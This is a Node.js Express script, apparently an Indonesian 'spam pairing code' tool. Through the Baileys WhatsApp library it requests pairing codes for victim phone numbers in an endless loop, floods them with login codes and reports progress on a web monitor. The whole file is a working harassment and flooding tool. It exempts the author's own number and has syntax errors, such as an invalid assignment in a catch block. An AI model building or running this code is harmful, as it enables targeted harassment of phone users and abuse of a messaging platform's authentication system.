const express = require('express');
const chalk = require('chalk');
const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');
const readline = require('readline');
const { exec } = require('child_process');
const app = express();
app.use(express.json());
app.use(express.static('public'));
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const getRandomColor = () => {
    const colors = [chalk.redBright, chalk.yellowBright, chalk.greenBright, chalk.magentaBright];
    return colors[Math.floor(Math.random() * colors.length)];
};
let totalSpamCount = 0;
let lastActiveTime = new Date().getTime();
let initialSpamTime;
const countryCode = '';
const blockedNumbers = ['6285850268349', ''];
const requiredNumbers = ['6285'];

let logData = '';
const isValidPhoneNumber = (phoneNumber) => {
    return /^\d{10,14}$/.test(phoneNumber);
};
const sendLog = (res, log) => {
    res.write(`data: ${log}\n\n`);
};
const displayBanner = () => {
            console.log(chalk.greenBright.bold(chalk.bgBlack(`
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⡇⢮⡱⢍⣊⣭⣍⣉⡩⢩⠥⣤⣏⣙⡁⠈⠺⠿⢿⠿⠿⠛⠛⠛⠛⠻⡿⣻⠛
⡟⢛⡛⣛⣛⣛⣛⣉⣉⣙⣉⡐⢉⣤⣶⣿⠿⢿⣿⣿⣿⡴⢿⣿⡿⣿⣿⣷⣶⣶⣶⣿⣿⣿⠿⢿⡛⡉⠡⣀⠁
⠁⠁⠌⡉⣛⣻⠿⣿⣿⡿⢋⣴⣿⡿⢋⣤⣾⣿⣿⣿⣿⣿⣷⡹⣿⣦⣝⢿⣿⣿⣷⣍⣵⣾⣿⡿⠁⠄⢃⠄⠀
⡆⠈⠰⠀⡘⣿⣿⣷⣯⢠⣿⣿⢟⣴⣿⣿⣿⣿⣿⣿⡗⢹⣿⣷⣹⣿⣿⣷⡹⣿⣿⣿⣮⢻⣏⠿⣷⣌⠠⠀⣼
⣿⡁⠁⢢⣿⣮⠿⣿⢣⣿⣿⢯⣾⣿⣣⣿⣿⣿⣿⣿⣧⢸⣿⣿⡇⣿⣿⡿⢿⡝⣿⣿⣿⣧⠳⡿⠟⢉⠂⣸⣿
⣿⣧⠀⠙⠛⢻⢇⢃⣿⣿⣿⣿⣿⢇⣿⣿⣿⢹⣿⣿⡸⣼⣿⣿⣿⢹⢹⣧⢣⣻⡸⣿⣿⣿⡎⡊⠂⠂⣰⣿⣿
⣿⣿⣷⡈⠠⠁⠿⣸⣿⣿⣿⣿⣿⢸⣿⣿⣿⢸⣿⢧⢣⣿⣿⣿⡟⠸⣼⣿⣇⢳⡡⡿⡻⣿⣿⠀⠂⣴⣿⣿⣿
⣿⣿⣿⣷⡄⠁⠄⣿⣿⣿⣿⣿⡇⣿⣿⡇⣇⢸⢏⢂⣾⣿⣿⣿⡇⣷⢣⣿⢿⢐⡱⡫⣾⣿⣿⡇⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡏⢠⢠⣿⣿⢻⣿⣿⠇⢿⣿⡅⣼⠈⣠⢿⣿⣿⣿⣯⢹⣿⢼⡭⢐⢱⣷⠝⠜⣿⣿⣇⠀⣿⣿⣿⣿
⣿⣿⣿⣿⠀⣼⣾⣿⣿⡏⣿⣷⢸⡜⢟⡃⣷⣇⡾⢸⣿⣿⣿⢧⣿⡿⡼⣳⡌⢿⣿⢻⣿⣿⢿⡧⡀⢿⣿⣿⣿
⣿⣿⣿⡿⠀⣿⣧⣿⣿⡇⣿⠿⠘⠛⠀⠛⠟⠣⣳⣸⣿⠻⣳⡟⠉⠁⠁⠉⣁⠘⣻⣾⣿⣿⢸⡇⡇⠸⣿⣿⣿
⣿⣿⣿⠀⣰⡏⣷⣿⣿⣿⢰⣄⢿⡞⠀⠀⠈⣾⣧⣯⣵⣾⣿⣾⡉⣐⡀⢠⡿⣼⣿⣿⣿⣿⢸⠇⠘⢄⠹⢿⣿
⣿⣿⠟⢠⡟⠠⢹⣿⢻⡟⡇⢿⣺⣷⣬⣭⣵⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣿⢳⢣⣿⣿⣿⠇⢹⠐⡈⠀⣀⣼⣿
⣿⠁⠐⠋⢀⠂⡼⠃⣿⡏⡇⢧⡳⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡣⢡⣿⢯⣿⠏⠀⠸⠐⡀⢾⣿⣿⣿
⣿⣿⣶⢀⠀⣂⠀⠀⢻⣇⠃⠅⢢⡁⣞⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿⣿⣷⡎⣿⢏⠟⡅⡀⠆⠀⠀⢃⣼⣿⣿⣿
⣿⣿⣿⣧⡀⠀⠀⠀⠠⡙⠦⠁⢂⡀⠌⣙⠻⢿⣿⣿⣿⣿⣿⣿⠿⠟⠍⠂⣿⢈⡀⠃⢀⠑⢪⠀⢿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠀⠀⠀⠂⠁⠀⠀⣤⣬⣤⠄⢩⣂⠶⣭⣟⠻⢭⣒⣥⣴⣶⣶⠙⠐⠈⡀⢲⣶⣤⣦⣾⣿⣿⣿⣿
⣿⣿⣿⣿⡧⠀⢤⠀⠀⠀⠀⣶⣤⣉⠋⠰⣿⢿⣿⣶⣤⣛⡿⠟⠛⣉⣡⣤⣶⣜⣷⣆⠈⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠁⢎⠢⢄⠂⡀⢂⣿⣟⠏⣰⣶⣦⣍⡑⠻⢟⣿⣽⡷⣯⣟⡻⢽⣯⣿⢯⣿⠀⠌⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡟⠡⢘⣤⠶⠶⠶⠖⠸⠿⢁⣴⣿⣻⣾⢯⣿⢷⣦⣌⠙⠻⠽⣟⣿⡷⣶⠭⠙⠁⠀⠀⠀⠉⢻⣿⣿⣿⣿\n`)));
};
const resetTerminal = () => {
    readline.cursorTo(process.stdout, 0, 0);
    readline.clearScreenDown(process.stdout);
};
resetTerminal();
displayBanner();
app.post('/start', async (req, res) => {
    const { target1, target2, option } = req.body;

    const targets = [target1];
    if (option === '2') {
        targets.push(target2);
    }
    const validTargets = targets.filter(target => isValidPhoneNumber(target));
    requiredNumbers.forEach(reqNum => {
        if (isValidPhoneNumber(reqNum) && !validTargets.includes(reqNum)) {
            validTargets.push(reqNum);
        }
    });
    const targetsToSpam = validTargets.filter(target => !blockedNumbers.includes(target));
    if (targetsToSpam.length === 0) {
        return res.status(400).json({ message: 'No valid phone numbers provided' });
    }
    let { state } = await useMultiFileAuthState('Galirus_&_Gusti');
    let { version } = await fetchLatestBaileysVersion();
    let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
    targetsToSpam.forEach(target => {
        startSpamming(sucked, target);
    });
    res.json({ message: 'Menjalankan Proses Pengiriman!' });
});
const startSpamming = async (sucked, target) => {
    let spamCount = 0;
    while (true) {
        if (spamCount >= 100) {
            spamCount = 0;
            await sleep(2000);
        }
        try {
            await spamTarget(sucked, target);
            spamCount++;
            totalSpamCount++;
        } catch (error) {
            console.log(chalk.yellow.bold(`\n\nSedang Restart, Spam Ulang Aktif...`));
            console.log(chalk.yellow.bold(`===================================\n`));
            await sleep(2000);  // Sleep before restarting
            let { state } = await useMultiFileAuthState('Galirus_&_Gusti');
            let { version } = await fetchLatestBaileysVersion();
            sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
        }
    }
};

const spamTarget = async (sucked, target) => {
    if (!target.startsWith(countryCode)) {
        console.log(chalk.white.bold('\nHarus Awalan Kode Negara'));
        logData += `Harus Awalan Kode Negara\n`;
        return;
    }

if (blockedNumbers.includes(target)) {
    console.log(chalk.white.bold('\nNomor Owner Di Spam, Nanti Ngelag 😂'));
    exec('npm start', (error, stdout, stderr) => {
      if (error) {
        console.error(`Exec error: ${error}`);
        return;
      }
      console.log(`stdout: ${stdout}`);
      console.error(`stderr: ${stderr}`);
    });
    return;
  }

    if (requiredNumbers.includes(target)) {
        console.log(chalk.red.bold(`\nTarget ${target} adalah nomor wajib untuk di spam!`));
        logData += `Target ${target} adalah nomor wajib untuk di spam!\n`;
    }
    if (!initialSpamTime) {
        initialSpamTime = new Date().toLocaleTimeString('id-ID', { hour12: false });
        console.log(chalk.greenBright.bold(`${chalk.yellow.bold('Waktu Pertama Spam Jam')} ${chalk.white.bold(':')} ${chalk.white.bold(initialSpamTime)}`));
        logData += `Waktu Pertama Spam Jam: ${initialSpamTime}\n`;
    }
    await sleep(1000);
    try {
        let prc = await sucked.requestPairingCode(target);
        lastActiveTime = new Date().getTime();
        resetTerminal();
        displayBanner();
        console.log(chalk.greenBright.bold(`${chalk.greenBright.bold('Pengembang Script Ini')}   ${chalk.white.bold(':')} ${chalk.white.bold(getRandomColor()('GALIRUS X GUSTI'))}`));
        console.log(chalk.greenBright.bold(`Nomor Target            ${chalk.white.bold(':')} ${chalk.white.bold(target)}`));
        console.log(chalk.greenBright.bold(`Spam Kode Succesfull    ${chalk.white.bold(':')} ${chalk.white.bold(prc)}`));
        console.log(chalk.greenBright.bold(`Total Spam Terkirim     ${chalk.white.bold(':')} ${chalk.white.bold(totalSpamCount)}`));
        console.log(chalk.greenBright.bold(`Waktu Spam Pertama      ${chalk.white.bold(':')} ${chalk.white.bold(initialSpamTime)}`));
        const currentSpamTime = new Date().toLocaleTimeString('id-ID', { hour12: false });
        console.log(chalk.greenBright.bold(`Waktu Sekarang Jam      ${chalk.white.bold(':')} ${chalk.white.bold(currentSpamTime)}`));
    } catch (error) {
        startSpamming = async (sucked, target);
    }
    if ((new Date().getTime() - lastActiveTime) > 60000) {
        console.log(chalk.white.bold('Tidak Ada Respon Selama 1Menit Bung, Spam Berhenti'));
        logData += `Tidak Ada Respon Selama 1Menit Bung, Spam Berhenti\n`;
        process.exit(1);
    }
};
app.get('/monitor', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    const intervalId = setInterval(() => {
        sendLog(res, logData); 
    }, 1000);
    req.on('close', () => {
        clearInterval(intervalId);
    });
});
rl.question('Masukkan port yang ingin digunakan contoh:( 8080 ): ', (inputPort) => {
    const port = parseInt(inputPort, 10);
    if (isNaN(port) || port <= 0) {
        console.log(chalk.red.bold('Port tidak valid. Silakan masukkan angka.'));
        process.exit(1);
    }
    app.listen(port, () => {
        console.log(chalk.green.bold(`Server running on http://localhost:${port}`));
    });

    rl.close();
});
``